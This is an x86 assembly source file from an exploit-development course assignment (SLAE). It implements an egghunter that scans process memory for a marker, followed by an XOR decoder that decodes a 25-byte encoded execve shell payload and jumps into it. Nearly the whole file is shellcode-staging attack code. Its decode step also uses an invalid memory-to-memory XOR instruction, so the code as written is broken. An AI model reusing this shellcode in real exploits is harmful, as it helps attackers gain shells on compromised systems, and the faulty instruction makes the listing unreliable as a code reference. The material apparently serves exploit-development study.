;
; Assignment 4 - Decoder/Egghunter combo
; Student ID:SLAE-860
; This was created, compiled, and objdump'ed to get the chunks needed for shconfig4.py to construct the shellcode for
;   the code[] segment of shellcode.c.  It should not need to be re-used, but is supplied with sample values to serve
;   as an example.

global _start
section .text
    _start:

     prep:
        xor edx, edx
	xor ecx, ecx
        cld

     pageloop:
        or dx, 0xfff

     mainloop:
        inc edx
        lea ebx, [edx+0x4]
        push 0x21
        pop eax
        int 0x80
        cmp al, 0xf2
        je pageloop
        mov eax, 0x1b2a1b2a                ; This is just a sample egg value
        mov edi, edx
        scasd
        jne mainloop
        scasd
        jne mainloop
        jmp short call_decoder             ; The key is now at EDI, and can start XORing against encoded shellcode.

     decoder:
        pop esi                            ; ESI should now have address of the encoded shellcode
        xor ecx, ecx
        mov cl, 25                         ; The key and shellcode bytes are the same length. Execve-stack is 25 bytes.
        lea eax, [edi]                     ; EAX is now a pointer to the key
     decode:
        xor byte [esi], byte [eax]         ; Should replace each encoded byte with decoded byte
        inc esi                            ; Move to next shellcode byte.
        inc eax                            ; Move to next key byte.
        loop decode                        ; Loop for the number of bytes
        jmp short enc_shellcode            ; Jump to what should be ready-to-execute shellcode.

     call_decoder:
        call decoder                       ; enc_shellcode below is just an example.
        enc_shellcode: db 0xf4,0x88,0xcb,0x4e,0x8b,0xf5,0x94,0xbc,0x23,0x7a,0x54,0xf3,0x2f,0xe1,0xe6,0x8a,0x03,0x68,0x28,0xba,0x64,0x27,0x85,0x1f,0x49